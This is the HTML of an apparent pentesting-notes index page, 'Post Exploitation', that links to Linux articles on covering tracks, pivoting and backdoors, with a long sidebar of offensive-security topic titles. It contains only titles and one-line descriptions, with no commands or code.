                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cms/bolt-cms-pentesting/">Bolt CMS Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Api
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/api/graphql-pentesting/">GraphQL Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/go-ssti/">Go SSTI</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/php-rce-cheat-sheet/">PHP RCE Cheat Sheet</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/dompdf-rce/">Dompdf RCE</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/broken-link-hijacking/">Broken Link Hijacking</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/ghostscript-pentesting/">GhostScript Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/html-smuggling/">HTML Smuggling</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/teamcity-pentesting/">TeamCity Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/dump-git-repository-from-website/">Dump Git Repository from Website</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/extract-web-browser-passwords/">Extract Web Browser Passwords</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/bookmarklet-attack/">Bookmarklet Attack</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/jwt-pentesting/">JWT (Json Web Token) Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cacti-pentesting/">Cacti Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/icinga-web-pentesting/">Icinga Web Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/apache-zeppelin-pentesting/">Apache Zeppelin Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/limesurvey-pentesting/">LimeSurvey Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/php-hash-hmac-bypass/">PHP hash_hmac Bypass</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/java-rmi-pentesting/">Java RMI Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/jboss-pentesting/">JBOSS Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cgi-pentesting/">CGI Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/php-srand-time-abusing/">PHP Srand Time Abusing</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/websocket-pentesting/">WebSocket Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/codiad-pentesting/">Codiad Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/apache-activemq-pentesting/">Apache ActiveMQ Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/clipbucket-pentesting/">ClipBucket Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/apache-tomcat-pentesting/">Apache Tomcat Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/log4j-pentesting/">Log4j Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/browser-in-the-browser-attack/">Browser in the Browser (BITB) Attack</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/opencats-pentesting/">OpenCATS Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/restaurant-management-system/">Restaurant Management System (RMS) Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/webanno-pentesting/">WebAnno Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/grafana-pentesting/">Grafana Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/webdav-pentesting/">WebDAV Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/jenkins-pentesting/">Jenkins Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/web-browser-settings-for-pentesting/">Web Browser Settings for Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/tiny-file-manager-pentesting/">Tiny File Manager Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/web-php-pentesting/">Web PHP Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/hashicorp-consul-pentesting/">HashiCorp Consul Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/oob-attack/">OOB (Out of Band) Attack</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/webmin-pentesting/">Webmin Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/atlassian-confluence-pentesting/">Atlassian Confluence Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cloud/aws-pentesting/">AWS (Amazon Web Services) Pentesting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/code-deobfuscation/">Code Deobfuscation</a></li>
                                                            
                                                        
                                                    </ul>
                                                </div>
                                            </li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
            
        </ul>
        
    </div>
    
        <ul class="sidebar-footer list-unstyled mb-0">
            
        </ul>
    
</nav>

                    <main class="page-content bg-transparent">
                        
<div id="top-header" class="top-header d-print-none">
    <div class="header-bar d-flex justify-content-between">
        <div class="d-flex align-items-center">
            <a href='/' class="logo-icon me-3" aria-label="HomePage" alt="HomePage">
                <div class="small">
                    
                            <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
                    
                </div>
                <div class="big">
                    
                            <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
                    
                </div>
            </a>
            <button id="close-sidebar" class="btn btn-icon btn-soft">
                <span class="material-icons size-20 menu-icon align-middle">menu</span>
            </button>
            
            
                    
                    <button id="flexsearch-button" class="ms-3 btn btn-soft" data-bs-toggle="collapse" data-bs-target="#FlexSearchCollapse" aria-expanded="false" aria-controls="FlexSearchCollapse">
                        <span class="material-icons size-20 menu-icon align-middle">search</span>
                        <span class="flexsearch-button-placeholder ms-1 me-2 d-none d-sm-block">Search</span>
                        <div class="d-none d-sm-block">
                            <span class="flexsearch-button-keys">
                                <kbd class="flexsearch-button-cmd-key">
                                    <svg width="44" height="15"><path d="M2.118,11.5A1.519,1.519,0,0,1,1,11.042,1.583,1.583,0,0,1,1,8.815a1.519,1.519,0,0,1,1.113-.458h.715V6.643H2.118A1.519,1.519,0,0,1,1,6.185,1.519,1.519,0,0,1,.547,5.071,1.519,1.519,0,0,1,1,3.958,1.519,1.519,0,0,1,2.118,3.5a1.519,1.519,0,0,1,1.114.458A1.519,1.519,0,0,1,3.69,5.071v.715H5.4V5.071A1.564,1.564,0,0,1,6.976,3.5,1.564,1.564,0,0,1,8.547,5.071,1.564,1.564,0,0,1,6.976,6.643H6.261V8.357h.715a1.575,1.575,0,0,1,1.113,2.685,1.583,1.583,0,0,1-2.227,0A1.519,1.519,0,0,1,5.4,9.929V9.214H3.69v.715a1.519,1.519,0,0,1-.458,1.113A1.519,1.519,0,0,1,2.118,11.5Zm0-.857a.714.714,0,0,0,.715-.714V9.214H2.118a.715.715,0,1,0,0,1.429Zm4.858,0a.715.715,0,1,0,0-1.429H6.261v.715a.714.714,0,0,0,.715.714ZM3.69,8.357H5.4V6.643H3.69ZM2.118,5.786h.715V5.071a.714.714,0,0,0-.715-.714.715.715,0,0,0-.5,1.22A.686.686,0,0,0,2.118,5.786Zm4.143,0h.715a.715.715,0,0,0,.5-1.22.715.715,0,0,0-1.22.5Z" fill="currentColor"></path><path d="M12.4,11.475H11.344l3.879-7.95h1.056Z" fill="currentColor"></path><path d="M25.073,5.384l-.864.576a2.121,2.121,0,0,0-1.786-.923,2.207,2.207,0,0,0-2.266,2.326,2.206,2.206,0,0,0,2.266,2.325,2.1,2.1,0,0,0,1.782-.918l.84.617a3.108,3.108,0,0,1-2.622,1.293,3.217,3.217,0,0,1-3.349-3.317,3.217,3.217,0,0,1,3.349-3.317A3.046,3.046,0,0,1,25.073,5.384Z" fill="currentColor"></path><path d="M30.993,5.142h-2.07v5.419H27.891V5.142h-2.07V4.164h5.172Z" fill="currentColor"></path><path d="M34.67,4.164c1.471,0,2.266.658,2.266,1.851,0,1.087-.832,1.809-2.134,1.855l2.107,2.691h-1.28L33.591,7.87H33.07v2.691H32.038v-6.4Zm-1.6.969v1.8h1.572c.832,0,1.22-.3,1.22-.918s-.411-.882-1.22-.882Z" fill="currentColor"></path><path d="M42.883,10.561H38.31v-6.4h1.033V9.583h3.54Z" fill="currentColor"></path></svg>
                                </kbd>
                                <kbd class="flexsearch-button-key">
                                    <svg width="15" height="15"><path d="M5.926,12.279H4.41L9.073,2.721H10.59Z" fill="currentColor"/></svg>
                                </kbd>
                            </span>
                        </div>
                    </button>
                
            </div>

        <div class="d-flex align-items-center">
            <ul class="list-unstyled mb-0">
                
            </ul>
            <button id="mode" class="btn btn-icon btn-default ms-2" type="button" aria-label="Toggle user interface mode">
                <span class="toggle-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" height="30" width="30" viewBox="0 0 48 48" fill="currentColor">
                        <title>Enable dark mode</title>
                        <path d="M24 42q-7.5 0-12.75-5.25T6 24q0-7.5 5.25-12.75T24 6q.4 0 .85.025.45.025 1.15.075-1.8 1.6-2.8 3.95-1 2.35-1 4.95 0 4.5 3.15 7.65Q28.5 25.8 33 25.8q2.6 0 4.95-.925T41.9 22.3q.05.6.075.975Q42 23.65 42 24q0 7.5-5.25 12.75T24 42Zm0-3q5.45 0 9.5-3.375t5.05-7.925q-1.25.55-2.675.825Q34.45 28.8 33 28.8q-5.75 0-9.775-4.025T19.2 15q0-1.2.25-2.575.25-1.375.9-3.125-4.9 1.35-8.125 5.475Q9 18.9 9 24q0 6.25 4.375 10.625T24 39Zm-.2-14.85Z"/>
                    </svg>
                </span>
                <span class="toggle-light">
                    <svg xmlns="http://www.w3.org/2000/svg" height="30" width="30" viewBox="0 0 48 48" fill="currentColor">
                        <title>Enable light mode</title>
                        <path d="M24 31q2.9 0 4.95-2.05Q31 26.9 31 24q0-2.9-2.05-4.95Q26.9 17 24 17q-2.9 0-4.95 2.05Q17 21.1 17 24q0 2.9 2.05 4.95Q21.1 31 24 31Zm0 3q-4.15 0-7.075-2.925T14 24q0-4.15 2.925-7.075T24 14q4.15 0 7.075 2.925T34 24q0 4.15-2.925 7.075T24 34ZM3.5 25.5q-.65 0-1.075-.425Q2 24.65 2 24q0-.65.425-1.075Q2.85 22.5 3.5 22.5h5q.65 0 1.075.425Q10 23.35 10 24q0 .65-.425 1.075-.425.425-1.075.425Zm36 0q-.65 0-1.075-.425Q38 24.65 38 24q0-.65.425-1.075.425-.425 1.075-.425h5q.65 0 1.075.425Q46 23.35 46 24q0 .65-.425 1.075-.425.425-1.075.425ZM24 10q-.65 0-1.075-.425Q22.5 9.15 22.5 8.5v-5q0-.65.425-1.075Q23.35 2 24 2q.65 0 1.075.425.425.425.425 1.075v5q0 .65-.425 1.075Q24.65 10 24 10Zm0 36q-.65 0-1.075-.425-.425-.425-.425-1.075v-5q0-.65.425-1.075Q23.35 38 24 38q.65 0 1.075.425.425.425.425 1.075v5q0 .65-.425 1.075Q24.65 46 24 46ZM12 14.1l-2.85-2.8q-.45-.45-.425-1.075.025-.625.425-1.075.45-.45 1.075-.45t1.075.45L14.1 12q.4.45.4 1.05 0 .6-.4 1-.4.45-1.025.45-.625 0-1.075-.4Zm24.7 24.75L33.9 36q-.4-.45-.4-1.075t.45-1.025q.4-.45 1-.45t1.05.45l2.85 2.8q.45.45.425 1.075-.025.625-.425 1.075-.45.45-1.075.45t-1.075-.45ZM33.9 14.1q-.45-.45-.45-1.05 0-.6.45-1.05l2.8-2.85q.45-.45 1.075-.425.625.025 1.075.425.45.45.45 1.075t-.45 1.075L36 14.1q-.4.4-1.025.4-.625 0-1.075-.4ZM9.15 38.85q-.45-.45-.45-1.075t.45-1.075L12 33.9q.45-.45 1.05-.45.6 0 1.05.45.45.45.45 1.05 0 .6-.45 1.05l-2.8 2.85q-.45.45-1.075.425-.625-.025-1.075-.425ZM24 24Z"/>
                    </svg>
                </span>
            </button>
            
        </div>
    </div>
    
    
            <div class="collapse" id="FlexSearchCollapse">
                <div class="flexsearch-container">
                    <div class="flexsearch-keymap">
                        <li>
                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd>
                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd>
                            <span class="flexsearch-key-label">to navigate</span>
                        </li>
                        <li>
                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd>
                            <span class="flexsearch-key-label">to select</span>
                        </li>
                        <li>
                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd>
                            <span class="flexsearch-key-label">to close</span>
                        </li>
                    </div>
                    <form class="flexsearch position-relative flex-grow-1 ms-2 me-2">
                        <div class="d-flex flex-row">
                            <input id="flexsearch" class="form-control" type="search" placeholder="Search" aria-label="Search" autocomplete="off">
                            <button id="hideFlexsearch" type="button" class="ms-2 btn btn-soft">
                                cancel
                            </button>
                        </div>
                        <div id="suggestions" class="shadow rounded-1 d-none"></div>
                    </form>
                </div>
            </div>
        
    
    
</div>

                            <div class="container-fluid">
                                <div class="layout-spacing">
                                    
                                        <div class="d-md-flex justify-content-between align-items-center"><nav aria-label="breadcrumb" class="d-inline-block pb-2 mt-1 mt-sm-0">
    <ul id="breadcrumbs" class="breadcrumb bg-transparent mb-0" itemscope itemtype="https://schema.org/BreadcrumbList">
        
            
                <li class="breadcrumb-item text-capitalize active" aria-current="page" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
                    <a itemprop="item" href="/docs/">
                        <i class="material-icons size-20 align-text-bottom" itemprop="name">Home</i>
                    </a>
                    <meta itemprop="position" content='1' />
                </li>
            
            
                <li class="breadcrumb-item text-capitalize" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
                    <a itemprop="item" href="/docs/hdks/">
                        <span itemprop="name">Notes [HDKS]</span>
                    </a>
                    <meta itemprop="position" content='2' />
                </li>
            
            
                <li class="breadcrumb-item text-capitalize" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
                    <a itemprop="item" href="/docs/hdks/linux/">
                        <span itemprop="name">Linux</span>
                    </a>
                    <meta itemprop="position" content='3' />
                </li>
            
        
            <li class="breadcrumb-item text-capitalize active" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
                <span itemprop="name">Post Exploitation</span>
                <meta itemprop="position" content='4' />
            </li>
        
    </ul>
</nav></div>
                                    
                                    <div class="row flex-xl-nowrap">
                                        
                                        <div class="docs-toc col-xl-3 visually-hidden visually-hidden  d-xl-block"><toc>
    <div class="fw-bold text-uppercase mb-2">On this page</div>
    <nav id="toc"></nav>
    </toc></div>
                                        
                                        
                                        <div class="docs-toc-mobile visually-hidden visually-hidden  d-print-none d-xl-none">
                                            <button id="toc-dropdown-btn" class="btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" data-bs-offset="0,0" aria-expanded="false">
                                                Table of Contents
                                            </button>
<nav id="toc-mobile"></nav></div>
                                        <div class="docs-content col-12  mt-0">
                                            <div class="mb-0 d-flex">
                                                
                                                <i class="material-icons title-icon me-2">article</i>
                                                
                                                <h1 class="content-title mb-0">
                                                    Post Exploitation
                                                    
                                                </h1>
                                            </div>
                                            
                                                <p class="lead mb-3"></p>
                                            
                                            <div id="content" class="main-content" data-bs-spy="scroll" data-bs-root-margin="0px 0px -65%" data-bs-target="#toc-mobile">
                                                
    <div class="row flex-xl-wrap">
        
        <div id="list-item" class="col-md-4 col-12 mt-4 pt-2">
            <a class="text-decoration-none text-reset" href="https://documentnation.github.io/docs/hdks/linux/post-exploitation/cover-your-tracks-in-linux/">
                <div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1">
                    <span class="icon-color d-flex my-3">
                        <i class="material-icons align-middle">article</i>
                        
                        
                    </span>
                    <div class="card-body p-0 content">
                        <p class="fs-5 fw-semibold card-title mb-1">Cover Your Tracks in Linux</p>
                        <p class="para card-text mb-0">After exploitation in Linux system, attackers want to erase their activities and be undetectable.</p>
                    </div>
                    
                </div>
            </a>
        </div>
        
        <div id="list-item" class="col-md-4 col-12 mt-4 pt-2">
            <a class="text-decoration-none text-reset" href="https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-pivoting/">
                <div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1">
                    <span class="icon-color d-flex my-3">
                        <i class="material-icons align-middle">article</i>
                        
                        
                    </span>
                    <div class="card-body p-0 content">
                        <p class="fs-5 fw-semibold card-title mb-1">Linux Pivoting</p>
                        <p class="para card-text mb-0">Accessing obtained over one machine to exploit another machine deeper in the network.</p>
                    </div>
                    
                </div>
            </a>
        </div>
        
        <div id="list-item" class="col-md-4 col-12 mt-4 pt-2">
            <a class="text-decoration-none text-reset" href="https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-backdoors/">
                <div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1">
                    <span class="icon-color d-flex my-3">
                        <i class="material-icons align-middle">article</i>
                        
                        
                    </span>
                    <div class="card-body p-0 content">
                        <p class="fs-5 fw-semibold card-title mb-1">Linux Backdoors</p>
                        <p class="para card-text mb-0">After compromising a target machine, the adversary attempts to establish persistent access. This </p>
                    </div>
                    
                </div>
            </a>
        </div>
        
    </div>

                                            </div>
                                            <div><hr class="doc-hr">
<div id="doc-nav" class="d-print-none">
</div></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
<footer class="shadow py-3 d-print-none">
    <div class="container-fluid">
        <div class="row align-items-center">
            <div class="col">
                <div class="text-sm-start text-center mx-md-2">
                    <p class="mb-0">
                        
                         2024 0X53 <em>[5105]</em>
                    </p>
                </div>
            </div>
        </div>
    </div>
</footer>
</main>
            </div>
        </div>

        
        
        <button onclick="topFunction()" id="back-to-top" aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12,10.224l-6.3,6.3L4.32,15.152,12,7.472l7.68,7.68L18.3,16.528Z" style="fill:#fff"/></svg></button>
        
        

        
        
            <script>(()=>{var e=document.getElementById("mode");e!==null&&(window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{e.matches?(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")):(localStorage.setItem("theme","light"),document.documentElement.removeAttribute("data-dark-mode"))}),e.addEventListener("click",()=>{document.documentElement.toggleAttribute("data-dark-mode"),localStorage.setItem("theme",document.documentElement.hasAttribute("data-dark-mode")?"dark":"light")}),localStorage.getItem("theme")==="dark"?document.documentElement.setAttribute("data-dark-mode",""):document.documentElement.removeAttribute("data-dark-mode"))})()</script>
        




    
        
        
    
    






    

    <script src="/docs/js/bootstrap.9bf1a2680076ecb3d5bf761d03e44316ea1546765dad06843315f94e5fd5d8e2257f2417a68c98561e887bfeac9556c9.js" integrity="sha384-m/GiaAB27LPVv3YdA&#43;RDFuoVRnZdrQaEMxX5Tl/V2OIlfyQXpoyYVh6Ie/6slVbJ"defer></script>


    <script type="text/javascript" src="https://documentnation.github.io/docs/js/bundle.min.76367c4b25f6d7f9df76ace8d8af690215e4aa3a790c071c79511d15d04b79127fa1e6a6e35c2bcaee420fbff212d5dd.js" integrity="sha384-djZ8SyX21/nfdqzo2K9pAhXkqjp5DAcceVEdFdBLeRJ/oeam41wryu5CD7/yEtXd" crossorigin="anonymous" defer></script>
        

        
        <script type="module">
    var suggestions = document.getElementById('suggestions');
    var search = document.getElementById('flexsearch');

    const flexsearchContainer = document.getElementById('FlexSearchCollapse');

    const hideFlexsearchBtn = document.getElementById('hideFlexsearch');

    const configObject = { toggle: false }
    const flexsearchContainerCollapse = new Collapse(flexsearchContainer, configObject) 

    if (search !== null) {
        document.addEventListener('keydown', inputFocus);
        flexsearchContainer.addEventListener('shown.bs.collapse', function () {
            search.focus();
        });
        
        var topHeader = document.getElementById("top-header");
        document.addEventListener('click', function(elem) {
            if (!flexsearchContainer.contains(elem.target) && !topHeader.contains(elem.target))
                flexsearchContainerCollapse.hide();
        });
    }

    hideFlexsearchBtn.addEventListener('click', () =>{
        flexsearchContainerCollapse.hide()
    })

    function inputFocus(e) {
        if (e.ctrlKey && e.key === '/') {
            e.preventDefault();
            flexsearchContainerCollapse.toggle();
        }
        if (e.key === 'Escape' ) {
            search.blur();
            
            flexsearchContainerCollapse.hide();
        }
    };

    document.addEventListener('click', function(event) {

    var isClickInsideElement = suggestions.contains(event.target);

    if (!isClickInsideElement) {
        suggestions.classList.add('d-none');
    }

    });

    


    document.addEventListener('keydown',suggestionFocus);

    function suggestionFocus(e) {
    const suggestionsHidden = suggestions.classList.contains('d-none');
    if (suggestionsHidden) return;

    const focusableSuggestions= [...suggestions.querySelectorAll('a')];
    if (focusableSuggestions.length === 0) return;

    const index = focusableSuggestions.indexOf(document.activeElement);

    if (e.key === "ArrowUp") {
        e.preventDefault();
        const nextIndex = index > 0 ? index - 1 : 0;
        focusableSuggestions[nextIndex].focus();
    }
    else if (e.key === "ArrowDown") {
        e.preventDefault();
        const nextIndex= index + 1 < focusableSuggestions.length ? index + 1 : index;
        focusableSuggestions[nextIndex].focus();
    }

    }

    


    (function(){

    var index = new FlexSearch.Document({
        
        tokenize: "forward",
        minlength:  0 ,
        cache:  100 ,
        optimize:  true ,
        document: {
        id: 'id',
        store: [
            "href", "title", "description"
        ],
        index: ["title", "description", "content"]
        }
    });


    


    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
